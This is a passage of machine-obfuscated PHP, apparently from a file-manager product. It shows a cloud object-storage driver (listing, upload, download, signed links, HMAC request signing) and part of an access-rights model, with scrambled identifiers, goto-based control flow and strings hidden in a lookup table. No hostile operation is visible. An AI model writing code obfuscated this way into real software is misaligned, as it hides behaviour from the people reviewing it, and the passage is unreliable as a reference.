$F®ƒœ”ÌŠ˜; } private function fileInfo($cî¢Œ¾¤¶©, $dÓÕ”œæ» = false, $Cˆñ¦±½’“ = array()) { goto d†ù†Ï›»À; AØ¢ëÀëã: if (empty($Cˆñ¦±½’“)) { $Cˆñ¦±½’“ = $this->objectMeta($cî¢Œ¾¤¶©); if (!$Cˆñ¦±½’“) { return $cƒé‚öÅì; } } if (isset($Cˆñ¦±½’“[$c¤‘ˆÒ•Ã[196]])) { $cƒé‚öÅì[$c¤‘ˆÒ•Ã[106]] = $Cˆñ¦±½’“[$c¤‘ˆÒ•Ã[196]]; } if (isset($Cˆñ¦±½’“[$c¤‘ˆÒ•Ã[77]])) { $cƒé‚öÅì[$c¤‘ˆÒ•Ã[77]] = $Cˆñ¦±½’“[$c¤‘ˆÒ•Ã[77]]; } goto A¢ô¼ï¼ˆ; A¢ô¼ï¼ˆ: return $cƒé‚öÅì; goto EñˆŒìà›; d†ù†Ï›»À: $c¤‘ˆÒ•Ã =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($dÓÕ”œæ») { return array($c¤‘ˆÒ•Ã[28] => $this->pathThis($cî¢Œ¾¤¶©), $c¤‘ˆÒ•Ã[75] => $this->getPathOuter($cî¢Œ¾¤¶©), $c¤‘ˆÒ•Ã[29] => $c¤‘ˆÒ•Ã[163], $c¤‘ˆÒ•Ã[156] => $this->ext($cî¢Œ¾¤¶©), $c¤‘ˆÒ•Ã[77] => isset($Cˆñ¦±½’“[$c¤‘ˆÒ•Ã[77]]) ? $Cˆñ¦±½’“[$c¤‘ˆÒ•Ã[77]] : 0, $c¤‘ˆÒ•Ã[193] => 0, $c¤‘ˆÒ•Ã[106] => 0, $c¤‘ˆÒ•Ã[194] => !0, $c¤‘ˆÒ•Ã[195] => !0); } $cƒé‚öÅì = array($c¤‘ˆÒ•Ã[28] => $this->pathThis($cî¢Œ¾¤¶©), $c¤‘ˆÒ•Ã[75] => $this->getPathOuter($cî¢Œ¾¤¶©), $c¤‘ˆÒ•Ã[29] => $c¤‘ˆÒ•Ã[163], $c¤‘ˆÒ•Ã[193] => 0, $c¤‘ˆÒ•Ã[106] => 0, $c¤‘ˆÒ•Ã[77] => 0, $c¤‘ˆÒ•Ã[156] => $this->ext($cî¢Œ¾¤¶©), $c¤‘ˆÒ•Ã[194] => !0, $c¤‘ˆÒ•Ã[195] => !0); goto AØ¢ëÀëã; EñˆŒìà›: } private function folderInfo($fíæ÷º¡”ù, $b’±¬×ÂÁ = false) { goto D†èÃ¦ˆ¥; BÔó´†‘¤Ó: if (isset($bÜ†Ü’ŠİÕ[$a×‹ª’È[196]])) { $e†”¶‹„ª¤[$a×‹ª’È[193]] = $bÜ†Ü’ŠİÕ[$a×‹ª’È[196]]; } return $e†”¶‹„ª¤; goto aÃ’¯ê½—; dŸ½–åÌàÇ: if ($fíæ÷º¡”ù == $a×‹ª’È[33]) { return $e†”¶‹„ª¤; } $fíæ÷º¡”ù = trim($fíæ÷º¡”ù, $a×‹ª’È[8]) . $a×‹ª’È[8]; $bÜ†Ü’ŠİÕ = $this->objectMeta($fíæ÷º¡”ù); goto BÔó´†‘¤Ó; D†èÃ¦ˆ¥: $a×‹ª’È =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($b’±¬×ÂÁ) { return array($a×‹ª’È[28] => $this->pathThis($fíæ÷º¡”ù), $a×‹ª’È[75] => $this->getPathOuter($a×‹ª’È[8] . $fíæ÷º¡”ù), $a×‹ª’È[29] => $a×‹ª’È[76], $a×‹ª’È[194] => !0, $a×‹ª’È[195] => !0); } $e†”¶‹„ª¤ = array($a×‹ª’È[28] => $this->pathThis($fíæ÷º¡”ù), $a×‹ª’È[75] => $this->getPathOuter($a×‹ª’È[8] . $fíæ÷º¡”ù), $a×‹ª’È[29] => $a×‹ª’È[76], $a×‹ª’È[193] => 0, $a×‹ª’È[106] => 0, $a×‹ª’È[194] => !0, $a×‹ª’È[195] => !0); goto dŸ½–åÌàÇ; aÃ’¯ê½—: } public function listObjs($fäïÇ–ï¡, $eƒà›«åß¥ = null, $DÒÙ¨‚ = null, $d—¥“Å„Œ£ = null) { $báœêÜĞ´‰ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fäïÇ–ï¡ = trim($fäïÇ–ï¡, $báœêÜĞ´‰[8]); $cæ‘¶ÇéÀ‡ = empty($fäïÇ–ï¡) ? $báœêÜĞ´‰[33] : $fäïÇ–ï¡ . $báœêÜĞ´‰[8]; return $this->client->getBucket($this->bucket, $cæ‘¶ÇéÀ‡, $eƒà›«åß¥, $DÒÙ¨‚, $d—¥“Å„Œ£, !0); } public function has($EŞÛàöÂ´ , $B˜¯ØŸ÷³¼ = false, $B ÷Ñö´’Ë = true) { goto A±¤™¿Š¨; C–ĞÔŒœà‘: if ($B˜¯ØŸ÷³¼) { return array($e©Æ¬®Éï[197] => $B­Æ§¤š, $e©Æ¬®Éï[198] => $DÌ†îğêÎ¤); } return !1; goto cÑÆñ½¦; A±¤™¿Š¨: $e©Æ¬®Éï =& $_SERVER[ºÖÙÂŒäÉê‡]; $B­Æ§¤š = 0; $DÌ†îğêÎ¤ = 0; goto Fù‰Ú‹ä; Fù‰Ú‹ä: $Eà±»ÍŠ¦‚ = $this->listObjs($EŞÛàöÂ´ , null, null, $e©Æ¬®Éï[8]); $Eà±»ÍŠ¦‚ = is_array($Eà±»ÍŠ¦‚) ? $Eà±»ÍŠ¦‚ : array(); foreach ($Eà±»ÍŠ¦‚ as $A˜ôäªÈê¶) { if (isset($A˜ôäªÈê¶[$e©Æ¬®Éï[28]]) && substr($A˜ôäªÈê¶[$e©Æ¬®Éï[28]], -1) != $e©Æ¬®Éï[8]) { if (!$B˜¯ØŸ÷³¼ && $B ÷Ñö´’Ë) { return !0; } $B­Æ§¤š++; } else { if (isset($A˜ôäªÈê¶[$e©Æ¬®Éï[192]])) { if (!$B˜¯ØŸ÷³¼ && !$B ÷Ñö´’Ë) { return !1; } $DÌ†îğêÎ¤++; } } } goto C–ĞÔŒœà‘; cÑÆñ½¦: } public function listAll($eÌ•÷²ÛŞñ) { $a±Û˜Ç¡¨â =& $_SERVER[ºÖÙÂŒäÉê‡]; $DŠ½¦­÷ Ö = $this->listObjs($eÌ•÷²ÛŞñ); $fæâ¤¢ğóì = $A”ªºêÕÂ… = array(); foreach ($DŠ½¦­÷ Ö as $e¨›¬‘ˆ× => $d®÷Ü„µéµ) { $fæâ¤¢ğóì[] = $d®÷Ü„µéµ[$a±Û˜Ç¡¨â[28]]; $A”ªºêÕÂ…[$e¨›¬‘ˆ×] = $d®÷Ü„µéµ[$a±Û˜Ç¡¨â[77]]; } return $this->listAllFiles($eÌ•÷²ÛŞñ, $fæâ¤¢ğóì, $A”ªºêÕÂ…); } public function canRead($DŠÇƒ¢›®) { $FœË•ÌªÓ =& $_SERVER[ºÖÙÂŒäÉê‡]; $B‰’ÇÎÚµ† = $this->client->getAccessControlPolicy($this->bucket, $DŠÇƒ¢›®); if (!$B‰’ÇÎÚµ†) { return !1; } return in_array($B‰’ÇÎÚµ†, array($FœË•ÌªÓ[199], $FœË•ÌªÓ[200], $FœË•ÌªÓ[201])) ? !0 : !1; } public function canWrite($e–Ñçî±’ç) { $FÇ×åè‡åÎ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e·ôÀ³‡¯ = $this->client->getAccessControlPolicy($this->bucket, $e–Ñçî±’ç); if (!$e·ôÀ³‡¯) { return !1; } return in_array($e·ôÀ³‡¯, array($FÇ×åè‡åÎ[199], $FÇ×åè‡åÎ[200])) ? !0 : !1; } public function getContent($B»ğ»ùÈ¶) { return $this->client->getObject($this->bucket, $B»ğ»ùÈ¶); } public function setContent($e—ºÜ“‹î±, $aô…¡íÈÑ = '', $E´Ø½øÑ®µ = false) { goto b—òŠ¼‡Ãš; e»æªáÔº: $E×“ùø‡”Î = $this->copyFile($e—ºÜ“‹î±, $e—ºÜ“‹î±, array($BÅÒÚˆÍ„[202] => $E×“ùø‡”Î[$BÅÒÚˆÍ„[203]])); return $E×“ùø‡”Î ? !0 : !1; goto B‹–×ÁÚŒ¨; b—òŠ¼‡Ãš: $BÅÒÚˆÍ„ =& $_SERVER[ºÖÙÂŒäÉê‡]; $e—ºÜ“‹î± = $E´Ø½øÑ®µ ? trim($e—ºÜ“‹î±, $BÅÒÚˆÍ„[8]) . $BÅÒÚˆÍ„[8] : $e—ºÜ“‹î±; $a‰ìáîÛ¸Ó = get_file_mime(get_path_ext($e—ºÜ“‹î±)); goto B†ÏÁÂàÃ’; B†ÏÁÂàÃ’: $E×“ùø‡”Î = $this->client->putObject($aô…¡íÈÑ, $this->bucket, $e—ºÜ“‹î±, $BÅÒÚˆÍ„[191], array(), $a‰ìáîÛ¸Ó); if (!$E×“ùø‡”Î) { return !1; } if ($E´Ø½øÑ®µ) { return !0; } goto e»æªáÔº; B‹–×ÁÚŒ¨: } public function fileSubstr($EºÏĞÇŸ‡˜, $AîŠ…­Ñ” , $D‹ôÏ³Ë¹Ñ) { $få³ÕîàÑÔ = $AîŠ…­Ñ”  + $D‹ôÏ³Ë¹Ñ - 1; return $this->client->getObject($this->bucket, $EºÏĞÇŸ‡˜, array($_SERVER[ºÖÙÂŒäÉê‡][204] => "\142\x79\x74\x65\x73\x3d{$AîŠ…­Ñ” }\55{$få³ÕîàÑÔ}")); } public function upload($bÚ˜¼ÊÆŠ™, $d¼öùç‡„ , $Bòä¿–§Îß = false, $Fİ¸³‘Ü = REPEAT_REPLACE) { $F„¹’÷Ğƒ =& $_SERVER[ºÖÙÂŒäÉê‡]; $E”ß¶ùÈÚ“ = array($F„¹’÷Ğƒ[202] => @md5_file($d¼öùç‡„ )); $D“’É‚Áºï = array($F„¹’÷Ğƒ[205] => get_file_mime(get_path_ext($bÚ˜¼ÊÆŠ™))); if (IO::size($d¼öùç‡„ ) <= 1024 * 1024 * 200) { $fÇË¡¸Å«× = $this->client->putObjectFile($d¼öùç‡„ , $this->bucket, $bÚ˜¼ÊÆŠ™, $F„¹’÷Ğƒ[191], $E”ß¶ùÈÚ“, $D“’É‚Áºï); return !empty($fÇË¡¸Å«×) ? $this->getPathOuter($bÚ˜¼ÊÆŠ™) : !1; } $aîŠÖ”Ù = $this->client->multiUploadObject($d¼öùç‡„ , $this->bucket, trim($bÚ˜¼ÊÆŠ™, $F„¹’÷Ğƒ[8]), $E”ß¶ùÈÚ“, $D“’É‚Áºï); return $aîŠÖ”Ù ? $this->getPathOuter($bÚ˜¼ÊÆŠ™) : !1; } public function download($a©Œº£œâ, $CŠğæŠò™©) { if (!@is_dir($this->pathFather($CŠğæŠò™©)) && !IO::mkdir($this->pathFather($CŠğæŠò™©))) { return !1; } $e—‘É•¼¯ = $this->client->getObject($this->bucket, $a©Œº£œâ, array(), $CŠğæŠò™©); return $e—‘É•¼¯ !== !1 ? $CŠğæŠò™© : !1; } public function link($BÎ ÍËˆ¥, $eÁ²Ÿ„•ÓÄ = array()) { $C®ß…ĞÄãõ =& $_SERVER[ºÖÙÂŒäÉê‡]; if ($this->signVer == $C®ß…ĞÄãõ[206]) { return $this->client->getAuthenticatedURL($this->bucket, $BÎ ÍËˆ¥, 3600 * 12, $eÁ²Ÿ„•ÓÄ); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($BÎ ÍËˆ¥, $C®ß…ĞÄãõ[8]), 3600 * 12, $this->region, array(), !0, $eÁ²Ÿ„•ÓÄ); } public function fileOut($eãÚæ‡ØŞ, $EÙ‹ÛÍ’ÎŠ = false, $A×öÖ¬ò = false, $Aàëª„Ó› = '') { goto F´åó¹ŠíÆ; F´åó¹ŠíÆ: $CÔ¨Ÿš‹Ê± =& $_SERVER[ºÖÙÂŒäÉê‡]; if (!$A×öÖ¬ò) { $A×öÖ¬ò = $this->pathThis($eãÚæ‡ØŞ); } $F«óÄÄªÁÅ = get_file_mime(get_path_ext($A×öÖ¬ò)); goto Aé­™˜ğ; b«ŒøĞ¢: $d‰İéĞ¤À¿ = $this->link($eãÚæ‡ØŞ, $BÄ¶ÉÅëÑñ); $this->fileOutLink($d‰İéĞ¤À¿); goto CìëÒ˜©§; Aé­™˜ğ: if ($F«óÄÄªÁÅ == $CÔ¨Ÿš‹Ê±[207]) { return parent::fileOut($eãÚæ‡ØŞ, $EÙ‹ÛÍ’ÎŠ, $A×öÖ¬ò, $Aàëª„Ó›); } $EÙ‹ÛÍ’ÎŠ = $EÙ‹ÛÍ’ÎŠ ? $CÔ¨Ÿš‹Ê±[208] : $CÔ¨Ÿš‹Ê±[209]; $BÄ¶ÉÅëÑñ = array($CÔ¨Ÿš‹Ê±[210] => $EÙ‹ÛÍ’ÎŠ . $CÔ¨Ÿš‹Ê±[211] . rawurlencode($A×öÖ¬ò), $CÔ¨Ÿš‹Ê±[212] => $F«óÄÄªÁÅ); goto b«ŒøĞ¢; CìëÒ˜©§: } public function fileOutServer($fõ³êê”Ş½, $fÊñ‹ƒ—ƒ† = false, $eÇğ¼ªÑñÄ = false, $dà‘¨¿¿ŸŒ = '') { parent::fileOut($fõ³êê”Ş½, $fÊñ‹ƒ—ƒ†, $eÇğ¼ªÑñÄ, $dà‘¨¿¿ŸŒ); } public function fileOutImage($cˆÍ±½åÛ–, $EÇî†Š«®– = 250) { $BÅª£¿Á¯« = $this->link($cˆÍ±½åÛ–); $this->fileOutLink($BÅª£¿Á¯«); } public function fileOutImageServer($E•ä‡ƒøÄ, $B…‘ÔÀÈ“ó = 250) { parent::fileOutImage($E•ä‡ƒøÄ, $B…‘ÔÀÈ“ó); } public function hashMd5($B‰ŒùèŸ˜ , $aâ¸ªÎãéŸ = '') { $aÅš…˜Æ…‚ =& $_SERVER[ºÖÙÂŒäÉê‡]; $dãÇ–óø« = $this->objectMeta($B‰ŒùèŸ˜ ); if (!$dãÇ–óø«) { return !1; } $aâ¸ªÎãéŸ = $aâ¸ªÎãéŸ ? $aâ¸ªÎãéŸ : _get($dãÇ–óø«, $aÅš…˜Æ…‚[213]); $aâ¸ªÎãéŸ = $aâ¸ªÎãéŸ ? $aâ¸ªÎãéŸ : _get($dãÇ–óø«, $aÅš…˜Æ…‚[203], $aÅš…˜Æ…‚[33]); return $aâ¸ªÎãéŸ; } public function uploadFormData($B‹­Á™‚ë½, $EĞ­âµ‹ê· = 3600) { $EÌ£†àÌ«ñ =& $_SERVER[ºÖÙÂŒäÉê‡]; $c÷†·…•Ş… = $this->pathFather($B‹­Á™‚ë½); $Fí‡›¹©òÎ = $this->client->getHttpUploadPostParams($this->bucket, $c÷†·…•Ş…, $EÌ£†àÌ«ñ[191], $EĞ­âµ‹ê·); return array_merge((array) $Fí‡›¹©òÎ, array($EÌ£†àÌ«ñ[165] => $this->getHost())); } public function multiUploadFormData($EÔë½¹¥Éù, $DÃ®¦˜‚Î¡ = 3600) { $F¸·ò®‰½ =& $_SERVER[ºÖÙÂŒäÉê‡]; $EÑßÃ‰åÄõ = gmdate($F¸·ò®‰½[214]); $Eµà±±ïì = array(); $DÆ´Ï×‘¤ = $this->client->getUploadId($this->bucket, $EÔë½¹¥Éù, $Eµà±±ïì); if (!$DÆ´Ï×‘¤) { return !1; } return array($F¸·ò®‰½[215] => $DÆ´Ï×‘¤, $F¸·ò®‰½[165] => $this->getHost() . $F¸·ò®‰½[8] . $this->pathEncode($EÔë½¹¥Éù), $F¸·ò®‰½[216] => $EÑßÃ‰åÄõ, $F¸·ò®‰½[89] => $EÔë½¹¥Éù); } public function multiUploadAuthData($fÔ©­±¥‚», $DøœšÜìÜ” = array()) { goto eËÍ£å¢; eËÍ£å¢: $CÑìøÅ–·† =& $_SERVER[ºÖÙÂŒäÉê‡]; $D·Ë•¢óª— = isset($DøœšÜìÜ”[$CÑìøÅ–·†[216]]) ? $DøœšÜìÜ”[$CÑìøÅ–·†[216]] : gmdate($CÑìøÅ–·†[214]); $eèáîÑ·Ù = isset($DøœšÜìÜ”[$CÑìøÅ–·†[156]]) ? $DøœšÜìÜ”[$CÑìøÅ–·†[156]] : $CÑìøÅ–·†[33]; goto f„Öƒ‚œ¸‚; B‘‘„¹®’ï: if (strpos($eèáîÑ·Ù, $CÑìøÅ–·†[219]) === 0) { return array($CÑìøÅ–·†[225] => $e’¢¥”âÇ‘, $CÑìøÅ–·†[216] => $D·Ë•¢óª—); } return $e’¢¥”âÇ‘; goto d©„ò‚ãÜî; f„Öƒ‚œ¸‚: $dƒ£ÏîŒ¯ = $DøœšÜìÜ”[$CÑìøÅ–·†[89]]; unset($DøœšÜìÜ”[$CÑìøÅ–·†[89]]); if (isset($DøœšÜìÜ”[$CÑìøÅ–·†[217]])) { $DøœšÜìÜ”[$CÑìøÅ–·†[216]] = $D·Ë•¢óª—; return $this->listUploadParts($dƒ£ÏîŒ¯, $DøœšÜìÜ”); } goto E÷ó¢²çÙ; E÷ó¢²çÙ: $e¹´—Ù­â = array($CÑìøÅ–·†[218], $CÑìøÅ–·†[33], $CÑìøÅ–·†[115], $CÑìøÅ–·†[33], "\170\55\x61\x6d\x7a\x2d\x64\141\164\x65\x3a{$D·Ë•¢óª—}", $CÑìøÅ–·†[8] . $this->bucket . $CÑìøÅ–·†[8] . $this->pathEncode($dƒ£ÏîŒ¯) . $eèáîÑ·Ù); if (strpos($eèáîÑ·Ù, $CÑìøÅ–·†[219]) === 0) { $e¹´—Ù­â[0] = $CÑìøÅ–·†[220]; } if (isset($DøœšÜìÜ”[$CÑìøÅ–·†[221]]) && $DøœšÜìÜ”[$CÑìøÅ–·†[221]] == $CÑìøÅ–·†[222]) { $e¹´—Ù­â[0] = $CÑìøÅ–·†[222]; } goto a§ÙÙ™Ä†°; a§ÙÙ™Ä†°: $B‹Ú‡ò´ = implode($CÑìøÅ–·†[174], $e¹´—Ù­â); $b¥ÊŞçá”ó = base64_encode(hash_hmac($CÑìøÅ–·†[223], $B‹Ú‡ò´, $this->secret, !0)); $e’¢¥”âÇ‘ = $CÑìøÅ–·†[224] . $this->accessKey . $CÑìøÅ–·†[4] . $b¥ÊŞçá”ó; goto B‘‘„¹®’ï; d©„ò‚ãÜî: } public function listUploadParts($c‡Í¢Å½ø¸, $EœÏ—°ß·ô = array()) { goto EÕ˜÷ïÏô©; DÍÇ·‘˜Ò¬: if (!$A¢ßİéÓêä) { return !1; } unset($EœÏ—°ß·ô[$eˆÆá²‡ÂĞ[217]], $EœÏ—°ß·ô[$eˆÆá²‡ÂĞ[221]]); $EœÏ—°ß·ô[$eˆÆá²‡ÂĞ[89]] = $c‡Í¢Å½ø¸; goto fÔ¹ïÏ‘¢; EÕ˜÷ïÏô©: $eˆÆá²‡ÂĞ =& $_SERVER[ºÖÙÂŒäÉê‡]; $A¬„œ¤‚í = str_replace($eˆÆá²‡ÂĞ[226], $eˆÆá²‡ÂĞ[33], $EœÏ—°ß·ô[$eˆÆá²‡ÂĞ[156]]); $A¢ßİéÓêä = $this->client->listParts($this->bucket, $c‡Í¢Å½ø¸, $A¬„œ¤‚í); goto DÍÇ·‘˜Ò¬; fÔ¹ïÏ‘¢: $BŠÏ˜²œ¨ = $this->multiUploadAuthData($c‡Í¢Å½ø¸, $EœÏ—°ß·ô); if (empty($BŠÏ˜²œ¨)) { return !1; } return array($eˆÆá²‡ÂĞ[225] => $BŠÏ˜²œ¨, $eˆÆá²‡ÂĞ[216] => $EœÏ—°ß·ô[$eˆÆá²‡ÂĞ[216]], $eˆÆá²‡ÂĞ[227] => $A¢ßİéÓêä); goto Fà¼¬“ØÎ; Fà¼¬“ØÎ: } public function getHost() { return parent::getHost() . $_SERVER[ºÖÙÂŒäÉê‡][8] . $this->bucket; } public function size($A”´¹¥¯´) { $aš—ÊÈã• = $this->objectMeta($A”´¹¥¯´); return $aš—ÊÈã• ? $aš—ÊÈã•[$_SERVER[ºÖÙÂŒäÉê‡][77]] : 0; } public function info($BÂíĞ°ŞŸ™) { if ($this->isFolder($BÂíĞ°ŞŸ™)) { return $this->folderInfo($BÂíĞ°ŞŸ™); } else { if ($this->isFile($BÂíĞ°ŞŸ™)) { return $this->fileInfo($BÂíĞ°ŞŸ™); } } return !1; } public function exist($dòãš¨‹¸©) { return $this->isFile($dòãš¨‹¸©) || $this->isFolder($dòãš¨‹¸©); } public function isFile($cˆ±ºöî¾‘) { return !$this->isFolder($cˆ±ºöî¾‘) && $this->objectMeta($cˆ±ºöî¾‘); } public function isFolder($BèÓíˆŒì) { return $this->cacheMethod($_SERVER[ºÖÙÂŒäÉê‡][228], $BèÓíˆŒì); } protected function objectMeta($aÉ²µ”ï÷¦) { return $this->cacheMethod($_SERVER[ºÖÙÂŒäÉê‡][229], $aÉ²µ”ï÷¦); } protected function _objectMeta($céš‚ˆÅ‚¾) { $a´¨•Şñ¾Ç =& $_SERVER[ºÖÙÂŒäÉê‡]; $céš‚ˆÅ‚¾ = rtrim($céš‚ˆÅ‚¾, $a´¨•Şñ¾Ç[8]); try { $f“×©˜­ë = $this->client->getObjectInfo($this->bucket, $céš‚ˆÅ‚¾); if (!isset($f“×©˜­ë[$a´¨•Şñ¾Ç[213]]) && isset($f“×©˜­ë[$a´¨•Şñ¾Ç[230]])) { $f“×©˜­ë[$a´¨•Şñ¾Ç[213]] = $f“×©˜­ë[$a´¨•Şñ¾Ç[230]]; } } catch (OSS\Core\OssException $Fë¼¬Ûìµó) { $f“×©˜­ë = !1; } if (!$f“×©˜­ë) { } return $f“×©˜­ë; } protected function _isFolder($DÏ…½­Á˜) { goto dàÔáØ’•‡; cÔÅòÚê: if (substr($fÎÜÙ†‘ Š[0][$D ‰™ù§Âª[28]], -1) == $D ‰™ù§Âª[8]) { return !0; } if (get_path_this($fÎÜÙ†‘ Š[0][$D ‰™ù§Âª[28]]) == get_path_this($DÏ…½­Á˜)) { return !1; } return !0; goto dº°òõ§İÄ; eÃƒ‚ÊÈæ: $fÎÜÙ†‘ Š = $this->client->getBucket($this->bucket, $DÏ…½­Á˜, null, 1); if (empty($fÎÜÙ†‘ Š)) { return !1; } $fÎÜÙ†‘ Š = array_values($fÎÜÙ†‘ Š); goto cÔÅòÚê; dàÔáØ’•‡: $D ‰™ù§Âª =& $_SERVER[ºÖÙÂŒäÉê‡]; $DÏ…½­Á˜ = rtrim($DÏ…½­Á˜, $D ‰™ù§Âª[8]); if ($DÏ…½­Á˜ == $D ‰™ù§Âª[33] || $DÏ…½­Á˜ == $D ‰™ù§Âª[8]) { return !0; } goto eÃƒ‚ÊÈæ; dº°òõ§İÄ: } } goto a±ÛŸ¦¯¡É; FŒ¡‚ÑÏÍ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\163\x6f\x75\162\x63\145\x5f\141\x75\x74\150"; public function getAuth($Eİˆœ²¤É) { goto EŠˆŒÄóÌ; b³¦Ç¹òÑÙ: $Cù¸ÜÙ‡Ö = $this->field($e—ˆš¿†Ÿ)->order($fˆß¬ô–ºë[372])->where($e×šãŠèÙè)->select(); $cÁÏÇ®–±´ = array(); foreach ($Cù¸ÜÙ‡Ö as $a÷ª¯ö–ôÛ) { if (Model($fˆß¬ô–ºë[2213])->listData($a÷ª¯ö–ôÛ[$fˆß¬ô–ºë[2194]])) { $cÁÏÇ®–±´[] = $a÷ª¯ö–ôÛ; } } goto aÓÀØ˜˜šã; aÓÀØ˜˜šã: return $cÁÏÇ®–±´; goto DĞ–æ‹ò¬ø; EŠˆŒÄóÌ: $fˆß¬ô–ºë =& $_SERVER[ºÖÙÂŒäÉê‡]; $e—ˆš¿†Ÿ = $fˆß¬ô–ºë[2212]; $e×šãŠèÙè = array($fˆß¬ô–ºë[374] => $Eİˆœ²¤É); goto b³¦Ç¹òÑÙ; DĞ–æ‹ò¬ø: } public function setAuth($aÌÂĞŸºä¾, $Fó¹Ä·’¸›) { goto dœá¸›×­É; aœÒê¼ÄœÏ: $d˜éÓ««… = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $B©«šñ™Ã = array(); foreach ($Fó¹Ä·’¸› as $F¬ÙÚ¬øÀö) { if (!in_array($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[376]], $d˜éÓ««…)) { show_json(LNG($b„áÆ­ˆ©İ[2214]), !1); } if ($DÆ‹äµ¢Î != $B·Ö²¸’šˆ) { if ($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[376]] == SourceModel::TYPE_GROUP) { } if ($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[460]] != 0 && !in_array($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[460]], $b´»ĞÂÏ”Õ)) { } } if ($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[460]] == 0) { $F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[376]] = SourceModel::TYPE_USER; } $B©«šñ™Ã[] = array($b„áÆ­ˆ©İ[374] => $aÌÂĞŸºä¾, $b„áÆ­ˆ©İ[376] => intval($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[376]]), $b„áÆ­ˆ©İ[460] => intval($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[460]]), $b„áÆ­ˆ©İ[2194] => intval($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[2194]]) ? intval($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[2194]]) : 0, $b„áÆ­ˆ©İ[2195] => intval($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[2195]]) ? intval($F¬ÙÚ¬øÀö[$b„áÆ­ˆ©İ[2195]]) : -1); } goto Bºâ…£Œù; Bºâ…£Œù: $this->where(array($b„áÆ­ˆ©İ[388] => $aÌÂĞŸºä¾))->delete(); $this->addAll($B©«šñ™Ã); return !0; goto a©è­àìò÷; dœá¸›×­É: $b„áÆ­ˆ©İ =& $_SERVER[ºÖÙÂŒäÉê‡]; $cˆ¾ØÖÜ«Õ = Model($b„áÆ­ˆ©İ[1100])->sourceInfo($aÌÂĞŸºä¾); if ($cˆ¾ØÖÜ«Õ[$b„áÆ­ˆ©İ[376]] != SourceModel::TYPE_GROUP) { return !1; } goto fäÂÎÔ…Ì–; fäÂÎÔ…Ì–: $B·Ö²¸’šˆ = 1; $DÆ‹äµ¢Î = $cˆ¾ØÖÜ«Õ[$b„áÆ­ˆ©İ[460]]; if ($DÆ‹äµ¢Î != $B·Ö²¸’šˆ) { $fõ•çğô»È = array($b„áÆ­ˆ©İ[2066] => $DÆ‹äµ¢Î); $b´»ĞÂÏ”Õ = Model($b„áÆ­ˆ©İ[2140])->field($b„áÆ­ˆ©İ[1403])->where($fõ•çğô»È)->select(); $b´»ĞÂÏ”Õ = array_to_keyvalue($b´»ĞÂÏ”Õ, $b„áÆ­ˆ©İ[33], $b„áÆ­ˆ©İ[1403]); } goto aœÒê¼ÄœÏ; a©è­àìò÷: } public function authClear($dµğ£æªÊ¨) { $aµ‰ƒƒ¯¸ =& $_SERVER[ºÖÙÂŒäÉê‡]; $C’¿ğê’Í = Model($aµ‰ƒƒ¯¸[1100])->sourceInfo($dµğ£æªÊ¨); $D±ß¥ŒäŒˆ = array($dµğ£æªÊ¨); if ($C’¿ğê’Í[$aµ‰ƒƒ¯¸[375]] == $aµ‰ƒƒ¯¸[83]) { $C«¤ÉˆÜÆ = array($aµ‰ƒƒ¯¸[529] => array($aµ‰ƒƒ¯¸[487], $C’¿ğê’Í[$aµ‰ƒƒ¯¸[463]] . $dµğ£æªÊ¨ . $aµ‰ƒƒ¯¸[488])); $D±ß¥ŒäŒˆ = Model($aµ‰ƒƒ¯¸[1100])->field($aµ‰ƒƒ¯¸[388])->where($C«¤ÉˆÜÆ)->getField($aµ‰ƒƒ¯¸[374], !0); $D±ß¥ŒäŒˆ[] = $dµğ£æªÊ¨; } $this->where(array($aµ‰ƒƒ¯¸[388] => array($aµ‰ƒƒ¯¸[389], $D±ß¥ŒäŒˆ)))->delete(); return !0; } public function get($BìÕ„ä£³) { $F²ãÀñ¯Ø³ = $this->getSourceList(array($BìÕ„ä£³), !0); return $F²ãÀñ¯Ø³[0]; } public function getSourceList($e†º‰èƒ‡Ş, $f‘ÔœÕ¶‚» = false) { goto FËöÃ‰î‘ç; aÅÏ‡ìØ´É: $fù¤–·À = array($dÚ‹·‡ˆĞâ[388] => array($dÚ‹·‡ˆĞâ[389], $AñÍÒØõ¹İ)); $CÂØò¦Å¡µ = $this->field($Cù¨ßåòÀ)->where($fù¤–·À)->select(); $CÂØò¦Å¡µ = array_to_keyvalue_group($CÂØò¦Å¡µ, $dÚ‹·‡ˆĞâ[374]); goto FìÓÇ·Ê—; Bã–‹Ö™›: if (!$f‘ÔœÕ¶‚») { $fù¤–·À = array($dÚ‹·‡ˆĞâ[388] => array($dÚ‹·‡ˆĞâ[389], $e†º‰èƒ‡Ş)); $f‘ÔœÕ¶‚» = $dà«ø÷äğ³->field($dÚ‹·‡ˆĞâ[2215])->where($fù¤–·À)->select(); $f‘ÔœÕ¶‚» = array_to_keyvalue($f‘ÔœÕ¶‚», $dÚ‹·‡ˆĞâ[374]); } $AñÍÒØõ¹İ = $e†º‰èƒ‡Ş; foreach ($f‘ÔœÕ¶‚» as $F½Íˆ™Õ± => $e›ÍªÈö«Ï) { $bˆî¯¬ˆÔ = $dà«ø÷äğ³->parentLevelArray($e›ÍªÈö«Ï[$dÚ‹·‡ˆĞâ[463]]); $AñÍÒØõ¹İ = array_merge($AñÍÒØõ¹İ, $bˆî¯¬ˆÔ, array($F½Íˆ™Õ±)); } goto BŠø¹§åõ; FìÓÇ·Ê—: $AêŞá¯–ö’ = array(); foreach ($f‘ÔœÕ¶‚» as $BÒÛŒŠä”› => $FÚùƒ§Ù¸) { $AêŞá¯–ö’[$BÒÛŒŠä”›] = $this->makeSourceAuth($FÚùƒ§Ù¸, $CÂØò¦Å¡µ); } 